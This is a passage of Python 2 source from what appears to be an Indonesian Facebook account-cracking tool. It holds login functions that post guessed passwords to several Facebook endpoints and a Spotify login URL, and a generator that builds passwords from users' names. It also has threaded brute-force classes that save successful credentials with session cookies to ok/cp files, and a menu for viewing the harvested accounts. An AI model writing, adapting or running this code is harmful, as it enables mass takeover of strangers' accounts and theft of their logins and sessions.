    r.headers.update({"Host":"touch.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get('https://touch.facebook.com/')
    b = bs4.BeautifulSoup(p.text, 'html.parser')
    meta = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
    data = {}
    for i in b('input'):
        if i.get('value') is None:
            if i.get('name') == 'email':
                data.update({'email': em})
            elif i.get('name') == 'pass':
                data.update({'pass': pas})
            else:
                data.update({i.get('name'): ''})
        else:
            data.update({i.get('name'): i.get('value')})

    data.update({'fb_dtsg': meta, 'm_sess': '', '__user': '0', '__req': 'd', 
       '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
    r.headers.update({'referer': 'https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8'})
    po = r.post('https://touch.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
    if 'c_user' in r.cookies.get_dict().keys():
        return {'status': 'success', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
    else:
        if 'checkpoint' in r.cookies.get_dict().keys():
            return {'status': 'cp', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
        else:
            return {'status': 'error', 'email': em, 'pass': pas}

        return

def f_fb(em, pas, hosts):
    r = requests.Session()
    r.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get('https://accounts.spotify.com/ar/login?method=facebook&continue=https%3A%2F%2Fwww.spotify.com%2Faccount%2Foverview%2F&intent=signup/')
    b = bs4.BeautifulSoup(p.text, 'html.parser')
    meta = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
    data = {}
    for i in b('input'):
        if i.get('value') is None:
            if i.get('name') == 'email':
                data.update({'email': em})
            elif i.get('name') == 'pass':
                data.update({'pass': pas})
            else:
                data.update({i.get('name'): ''})
        else:
            data.update({i.get('name'): i.get('value')})

    data.update({"fb_dtsg":meta,"m_sess":"","__user":"0","__req":"d","__csr":"","__a":"","__dyn":"","encpass":""})
    r.headers.update({"referer":"https://accounts.spotify.com/ar/login?method=facebook&continue=https%3A%2F%2Fwww.spotify.com%2Faccount%2Foverview%2F&intent=signup/?next&ref=dbl&fl&refid=8"})
    po = r.post('https://accounts.spotify.com/ar/login?method=facebook&continue=https%3A%2F%2Fwww.spotify.com%2Faccount%2Foverview%2F&intent=signup/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
    if 'c_user' in r.cookies.get_dict().keys():
        return {'status': 'success', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
    else:
        if 'checkpoint' in r.cookies.get_dict().keys():
            return {'status': 'cp', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
        else:
            return {'status': 'error', 'email': em, 'pass': pas}

        return

def graph_fb(em, pas, hosts):
    r = requests.Session()
    r.headers.update({"Host":"graph.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get('https://mbasic.facebook.com/')
    b = bs4.BeautifulSoup(p.text, 'html.parser')
    meta = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
    data = {}
    for i in b('input'):
        if i.get('value') is None:
            if i.get('name') == 'email':
                data.update({'email': em})
            elif i.get('name') == 'pass':
                data.update({'pass': pas})
            else:
                data.update({i.get('name'): ''})
        else:
            data.update({i.get('name'): i.get('value')})

    data.update({'fb_dtsg': meta, 'm_sess': '', '__user': '0', '__req': 'd', 
       '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
    r.headers.update({'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8'})
    po = r.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
    if 'c_user' in r.cookies.get_dict().keys():
        return {'status': 'success', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
    else:
        if 'checkpoint' in r.cookies.get_dict().keys():
            return {'status': 'cp', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
        else:
            return {'status': 'error', 'email': em, 'pass': pas}

        return

#### CRACKERNYA ###

def generate(text):
    results = []
    for i in text.split(' '):
        if len(i) < 3:
            continue
        else:
            i = i.lower()
            if len(i) == 3 or len(i) == 4 or len(i) == 5:
                results.append(i + '123')
                results.append(i + '12345')
            else:
                results.append(i + '123')
                results.append(i + '12345')
                results.append(i)
    return results

###### BRUTE FORCE #######

class crack:
    print ''
    def __init__(self,isifile):
        self.ada = []
        self.cp = []
        self.ko = 0
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Crack With Pass Default Or Manual [d/m]'
        while True:
            f = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Choose: ')
            if f == '':
                continue
            elif f == 'm':
                try:
                    while True:
                        try:
                            self.apk = isifile
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '   %s' % e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0]})
                        except:
                            continue

                except Exception as e:
                    print '%s' % e
                    continue
                print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Example : pass123,pass12345'
                self.pwlist()
                break
            elif f == 'd':
                try:
                    while True:
                        try:
                            self.apk = isifile
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '   %s' % e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0], 'pw': generate(i.split('<=>')[1])})
                        except:
                            continue

                except Exception as e:
                    print '   %s' % e
                    continue
                print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [OK] saved to : mbasic/ok.txt'
                print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [CP] saved to : mbasic/cp.txt'
                ThreadPool(35).map(self.main, self.fl)
                os.remove(self.apk)
                print '\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Done Ya Anjing'
                break

    def pwlist(self):
        self.pw = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Password List: ').split(',')
        if len(self.pw) == 0:
            self.pwlist()
        else:
            for i in self.fl:
                i.update({'pw': self.pw})
            print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [OK] saved to : mbasic/ok.txt'
            print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [CP] saved to : mbasic/cp.txt'
            ThreadPool(30).map(self.main, self.fl)
            os.remove(self.apk)
            print '\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Done Ya Anjing'

    def main(self, fl):
        try:
            for i in fl.get('pw'):
                log = mbasic(fl.get('id'), i, 'https://mbasic.facebook.com')
                if log.get('status') == 'success':
                    print '\r \x1b[1;32m[OK]%s %s \xe2\x80\xa2 %s %s      \x1b[1;37m' % (G, fl.get('id'), i, N)
                    self.ada.append('%s|%s' % (fl.get('id'), i))
                    if fl.get('id') in open('ok.txt').read():
                        break
                    else:
                        open('mbasic/ok.txt', 'a+').write('%s|%s|%s\n\n' % (fl.get('id'), i, gets_cookies(log.get('cookies'))))
                    ko = '%s|%s|%s\n\n' % (fl.get('id'), i, gets_cookies(log.get('cookies')))
                    break
                elif log.get('status') == 'cp':
                    print '\r\x1b[1;33m [CP]%s %s \xe2\x80\xa2 %s %s      \x1b[1;37m' % (O, fl.get('id'), i, N)
                    self.cp.append('%s|%s' % (fl.get('id'), i))
                    open('mbasic/cp.txt', 'a+').write('%s|%s|\n' % (fl.get('id'), i))
                    break
                else:
                    continue

            self.ko += 1
            print '\r [Crack] %s/%s - Ok-:%s - Cp-:%s' % (self.ko, len(self.fl), len(self.ada), len(self.cp)),
            sys.stdout.flush()
        except:
            self.main(fl)


class crack1:
    print ''
    def __init__(self,isifile):
        self.ada = []
        self.cp = []
        self.ko = 0
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Crack With Pass Default Or Manual [d/m]'
        while True:
            f = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Choose: ')
            if f == '':
                continue
            elif f == 'm':
                try:
                    while True:
                        try:
                            self.apk = isifile
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '   %s' % e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0]})
                        except:
                            continue

                except Exception as e:
                    print '%s' % e
                    continue

                print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Example : pass123,pass12345'
                self.pwlist()
                break
            elif f == 'd':
                try:
                    while True:
                        try:
                            self.apk = isifile
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '   %s' % e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0], 'pw': generate(i.split('<=>')[1])})
                        except:
                            continue

                except Exception as e:
                    print '   %s' % e
                    continue

                print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [OK] saved to : mfb/ok.txt'
                print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [CP] saved to : mfb/cp.txt'
                ThreadPool(35).map(self.main, self.fl)
                os.remove(self.apk)
                print '\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Done Ya Anjing'
                break

    def pwlist(self):
        self.pw = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Password List: ').split(',')
        if len(self.pw) == 0:
            self.pwlist()
        else:
            for i in self.fl:
                i.update({'pw': self.pw})

            print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [OK] saved to : mfb/ok.txt'
            print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [CP] saved to : mfb/cp.txt'
            ThreadPool(30).map(self.main, self.fl)
            os.remove(self.apk)
            print '\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Done Ya Anjing'

    def main(self, fl):
        try:
            for i in fl.get('pw'):
                log = m_fb(fl.get('id'), i, 'https://m.facebook.com')
                if log.get('status') == 'success':
                    print '\r \x1b[1;32m[OK]%s %s \xe2\x80\xa2 %s %s      \x1b[1;37m' % (G, fl.get('id'), i, N)
                    self.ada.append('%s|%s' % (fl.get('id'), i))
                    if fl.get('id') in open('ok.txt').read():
                        break
                    else:
                        open('mfb/ok.txt', 'a+').write('%s|%s|%s\n\n' % (fl.get('id'), i, gets_cookies(log.get('cookies'))))
                    ko = '%s|%s|%s\n\n' % (fl.get('id'), i, gets_cookies(log.get('cookies')))
                    break
                elif log.get('status') == 'cp':
                    print '\r \x1b[1;33m[CP]%s %s \xe2\x80\xa2 %s %s      \x1b[1;37m' % (O, fl.get('id'), i, N)
                    self.cp.append('%s|%s' % (fl.get('id'), i))
                    open('mfb/cp.txt', 'a+').write('%s|%s|\n' % (fl.get('id'), i))
                    break
                else:
                    continue

            self.ko += 1
            print '\r [Crack] %s/%s - Ok-:%s - Cp-:%s' % (self.ko, len(self.fl), len(self.ada), len(self.cp)),
            sys.stdout.flush()
        except:
            self.main(fl)


class crack2:
    print ''
    def __init__(self,isifile):
        self.ada = []
        self.cp = []
        self.ko = 0
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Crack With Pass Default Or Manual [d/m]'
        while True:
            f = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Choose: ')
            if f == '':
                continue
            elif f == 'm':
                try:
                    while True:
                        try:
                            self.apk=isifile
                            self.fs=open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '   %s' % e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0]})
                        except:
                            continue

                except Exception as e:
                    print '%s' % e
                    continue

                print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Example : pass123,pass12345'
                self.pwlist()
                break
            elif f == 'd':
                try:
                    while True:
                        try:
                            self.apk = isifile
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '   %s' % e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0], 'pw': generate(i.split('<=>')[1])})
                        except:
                            continue

                except Exception as e:
                    print '   %s' % e
                    continue

                print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [OK] saved to : touchfb/ok.txt'
                print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [CP] saved to : touchfb/cp.txt'
                ThreadPool(35).map(self.main, self.fl)
                os.remove(self.apk)
                print '\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Done Ya Anjing'
                break

    def pwlist(self):
        self.pw = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Password List: ').split(',')
        if len(self.pw) == 0:
            self.pwlist()
        else:
            for i in self.fl:
                i.update({'pw': self.pw})

            print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [OK] saved to : touchfb/ok.txt'
            print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [CP] saved to : touchfb/cp.txt'
            ThreadPool(30).map(self.main, self.fl)
            os.remove(self.apk)
            print '\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Done Ya Anjing'

    def main(self, fl):
        try:
            for i in fl.get('pw'):
                log = touch_fb(fl.get('id'), i, 'https://touch.facebook.com')
                if log.get('status') == 'success':
                    print '\r \x1b[1;32m[OK]%s %s \xe2\x80\xa2 %s %s      \x1b[1;37m' % (G, fl.get('id'), i, N)
                    self.ada.append('%s|%s' % (fl.get('id'), i))
                    if fl.get('id') in open('ok.txt').read():
                        break
                    else:
                        open('touchfb/ok.txt', 'a+').write('%s|%s|%s\n\n' % (fl.get('id'), i, gets_cookies(log.get('cookies'))))
                    ko = '%s|%s|%s\n\n' % (fl.get('id'), i, gets_cookies(log.get('cookies')))
                    break
                elif log.get('status') == 'cp':
                    print '\r \x1b[1;33m[CP]%s %s \xe2\x80\xa2 %s %s      \x1b[1;37m' % (O, fl.get('id'), i, N)
                    self.cp.append('%s|%s' % (fl.get('id'), i))
                    open('touchfb/cp.txt', 'a+').write('%s|%s|\n' % (fl.get('id'), i))
                    break
                else:
                    continue

            self.ko += 1
            print '\r [Crack] %s/%s - Ok-:%s - Cp-:%s' % (self.ko, len(self.fl), len(self.ada), len(self.cp)),
            sys.stdout.flush()
        except:
            self.main(fl)

class freefb:
    print ''
    def __init__(self,isifile):
        self.ada = []
        self.cp = []
        self.ko = 0
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Crack With Pass Default Or Manual [d/m]'
        while True:
            f = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Choose: ')
            if f == '':
                continue
            elif f == 'm':
                try:
                    while True:
                        try:
                            self.apk = isifile
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '   %s' % e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0]})
                        except:
                            continue

                except Exception as e:
                    print '%s' % e
                    continue

                print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Example : pass123,pass12345'
                self.pwlist()
                break
            elif f == 'd':
                try:
                    while True:
                        try:
                            self.apk = isifile
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '   %s' % e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0], 'pw': generate(i.split('<=>')[1])})
                        except:
                            continue

                except Exception as e:
                    print '   %s' % e
                    continue

                print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [OK] saved to : freefb/ok.txt'
                print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [CP] saved to : freefb/cp.txt'
                ThreadPool(35).map(self.main, self.fl)
                os.remove(self.apk)
                print '\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Done Ya Anjing'
                break

    def pwlist(self):
        self.pw = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Password List: ').split(',')
        if len(self.pw) == 0:
            self.pwlist()
        else:
            for i in self.fl:
                i.update({'pw': self.pw})

            print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [OK] saved to : freefb/ok.txt'
            print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [CP] saved to : freefb/cp.txt'
            ThreadPool(30).map(self.main, self.fl)
            os.remove(self.apk)
            print '\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Done Ya Anjing'

    def main(self, fl):
        try:
            for i in fl.get('pw'):
                log = f_fb(fl.get('id'), i, 'https://free.facebook.com')
                if log.get('status') == 'success':
                    print '\r \x1b[1;32m[OK]%s %s \xe2\x80\xa2 %s %s      \x1b[1;37m' % (G, fl.get('id'), i, N)
                    self.ada.append('%s|%s' % (fl.get('id'), i))
                    if fl.get('id') in open('ok.txt').read():
                        break
                    else:
                        open('freefb/ok.txt', 'a+').write('%s|%s|%s\n\n' % (fl.get('id'), i, gets_cookies(log.get('cookies'))))
                    ko = '%s|%s|%s\n\n' % (fl.get('id'), i, gets_cookies(log.get('cookies')))
                    break
                elif log.get('status') == 'cp':
                    print '\r\x1b[1;33m [CP]%s %s \xe2\x80\xa2 %s %s      \x1b[1;37m' % (O, fl.get('id'), i, N)
                    self.cp.append('%s|%s' % (fl.get('id'), i))
                    open('freefb/cp.txt', 'a+').write('%s|%s|\n' % (fl.get('id'), i))
                    break
                else:
                    continue

            self.ko += 1
            print '\r [Crack] %s/%s - Ok-:%s - Cp-:%s' % (self.ko, len(self.fl), len(self.ada), len(self.cp)),
            sys.stdout.flush()
        except:
            self.main(fl)

class crack3:
    print ''
    def __init__(self,isifile):
        self.ada = []
        self.cp = []
        self.ko = 0
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Crack With Pass Default Or Manual [d/m]'
        while True:
            f = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Choose: ')
            if f == '':
                continue
            elif f == 'm':
                try:
                    while True:
                        try:
                            self.apk = isifile
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '   %s' % e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0]})
                        except:
                            continue

                except Exception as e:
                    print '%s' % e
                    continue

                print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Example : pass123,pass12345'
                self.pwlist()
                break
            elif f == 'd':
                try:
                    while True:
                        try:
                            self.apk = isifile
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '   %s' % e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0], 'pw': generate(i.split('<=>')[1])})
                        except:
                            continue

                except Exception as e:
                    print '   %s' % e
                    continue

                print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [OK] saved to : apifb/ok.txt'
                print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [CP] saved to : apifb/cp.txt'
                ThreadPool(35).map(self.main, self.fl)
                os.remove(self.apk)
                print '\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Done Ya Anjing'
                break

    def pwlist(self):
        self.pw = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Password List: ').split(',')
        if len(self.pw) == 0:
            self.pwlist()
        else:
            for i in self.fl:
                i.update({'pw': self.pw})

            print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [OK] saved to : apifb/ok.txt'
            print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [CP] saved to : apifb/cp.txt'
            ThreadPool(30).map(self.main, self.fl)
            os.remove(self.apk)
            print '\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Done Ya Anjing'

    def main(self, fl):
        try:
            for i in fl.get('pw'):
                log = graph_fb(fl.get('id'), i, 'https://graph.facebook.com')
                if log.get('status') == 'success':
                    print '\r \x1b[1;32m[OK]%s %s \xe2\x80\xa2 %s %s      \x1b[1;37m' % (G, fl.get('id'), i, N)
                    self.ada.append('%s|%s' % (fl.get('id'), i))
                    if fl.get('id') in open('ok.txt').read():
                        break
                    else:
                        open('apifb/ok.txt', 'a+').write('%s|%s|%s\n\n' % (fl.get('id'), i, gets_cookies(log.get('cookies'))))
                    ko = '%s|%s|%s\n\n' % (fl.get('id'), i, gets_cookies(log.get('cookies')))
                    break
                elif log.get('status') == 'cp':
                    print '\r\x1b[1;33m [CP]%s %s \xe2\x80\xa2 %s %s      \x1b[1;37m' % (O, fl.get('id'), i, N)
                    self.cp.append('%s|%s' % (fl.get('id'), i))
                    open('apifb/cp.txt', 'a+').write('%s|%s|\n' % (fl.get('id'), i))
                    break
                else:
                    continue

            self.ko += 1
            print '\r [Crack] %s/%s - Ok-:%s - Cp-:%s' % (self.ko, len(self.fl), len(self.ada), len(self.cp)),
            sys.stdout.flush()
        except:
            self.main(fl)

### Result Hasill ####

def results(kntl,zecheed):
        if len(kntl) !=0:
                print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] "+str(len(kntl))))
        if len(zecheed) !=0:
                print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] CP: "+str(len(zecheed))))
        if len(kntl) ==0 and len(zecheed) ==0:
                print("\n")
                print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] No Result Found"))

### Pilih Result ###
def ress():
    os.system('clear')
    print logo
    print("\033[0;96m"+50*"-")
    print("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] RESULT CRACKER")
    print("\033[0;96m"+50*"-")
    print("\033[0;96m\033[0;97m [\033[1;36m1\033[1;37m] Cek Result Crack Mbasic.Facebook") 
    print("\033[0;96m\033[0;97m [\033[1;36m2\033[1;37m] Cek Result Crack M.Facebook") 
    print("\033[0;96m\033[0;97m [\033[1;36m3\033[1;37m] Cek Result Crack Touch.Facebook")
    print("\033[0;96m\033[0;97m [\033[1;36m4\033[1;37m] Cek Result Crack Api.Facebook")
    print("\033[0;96m\033[0;97m [\033[1;36m5\033[1;37m] Cek Result Crack Free.Facebook")
    print("\033[0;96m\033[0;97m [\033[1;36m6\033[1;37m] Cek Result Crack Email")
    print("\033[0;96m\033[0;97m [\033[1;36m7\033[1;37m] Cek Result Crack Phone Number")
    print("\033[0;96m\033[0;97m [\033[1;36m0\033[1;37m] Back To Menu")
    pill = raw_input('\n\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Choose: ')
    if pill =="1" or pill =="01":
        result_mbasicc()
    elif pill =="2" or pill =="02":
        result_emefbi()
    elif pill =="3" or pill =="03":
        result_touchh()
    elif pill =="4" or pill =="04":
        result_apei()
    elif pill =="5" or pill =="05":
        result_freeefbi()
    elif pill =="6" or pill =="06":
        result_emailampas()
    elif pill =="7" or pill =="07":
        result_nomoertogel()
    elif pill =="0" or pill =="00":
        menu()
    else:
        print('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Keyword Salah!').format(R, N)
        ress()

### Result ###

def result_mbasicc():
    os.system('clear')
    print logo
    print("\033[0;96m"+50*"-")
    print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result Cracker Mbasic\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m]"))
    print("\033[0;96m"+50*"-")
    print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result OK "))
    try:
        os.system("cat mbasic/ok.txt")
    except IOError:
        print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] No Result Found"))
    print(("\n\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result CP"))
    try:
        os.system("cat mbasic/cp.txt")
    except IOError:
        print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] No Result Found"))
    n = raw_input("\033[1;37m [BACK]")
    menu()

def result_emefbi():
    os.system('clear')
    print logo
    print("\033[0;96m"+50*"-")
    print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result Cracker M.Facebook\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m]"))
    print("\033[0;96m"+50*"-")
    print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result OK "))
    try:
        os.system("cat mfb/ok.txt")
    except IOError:
        print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] No Result Found"))
    print(("\n\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result CP"))
    try:
        os.system("cat mfb/cp.txt")
    except IOError:
        print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] No Result Found"))
    n = raw_input("\033[1;37m [BACK]")
    menu()

def result_touchh():
    os.system('clear')
    print logo 
    print("\033[0;96m"+50*"-")
    print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result Cracker Touch.Facebook\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m]"))
    print("\033[0;96m"+50*"-")
    print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result OK "))
    try:
        os.system("cat touchfb/ok.txt")
    except IOError:
        print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] No Result Found"))
    print(("\n\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result CP"))
    try:
        os.system("cat touchfb/cp.txt")
    except IOError:
        print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] No Result Found"))
    n = raw_input("\033[1;37m [BACK]")
    menu()

def result_apei():
    os.system('clear')
    print logo
    print("\033[0;96m"+50*"-")
    print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result Cracker Api.Facebook\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m]"))
    print("\033[0;96m"+50*"-")
    print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result OK "))
    try:
        os.system("cat apifb/ok.txt")
    except IOError:
        print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] No Result Found"))
    print(("\n\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result CP"))
    try:
        os.system("cat apifb/cp.txt")
    except IOError:
        print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] No Result Found"))
    n = raw_input("\033[1;37m [BACK]")
    menu()

def result_freeefbi():
    os.system('clear')
    print logo 
    print("\033[0;96m"+50*"-")
    print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result Cracker Free.Facebook\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m]"))
    print("\033[0;96m"+50*"-")
    print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result OK "))
    try:
        os.system("cat freefb/ok.txt")
    except IOError:
        print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] No Result Found"))
    print(("\n\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result CP"))
    try:
        os.system("cat freefb/cp.txt")
    except IOError:
        print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] No Result Found"))
    n = raw_input("\033[1;37m [BACK]")
    menu()

def result_emailampas():
    os.system('clear')
    print logo
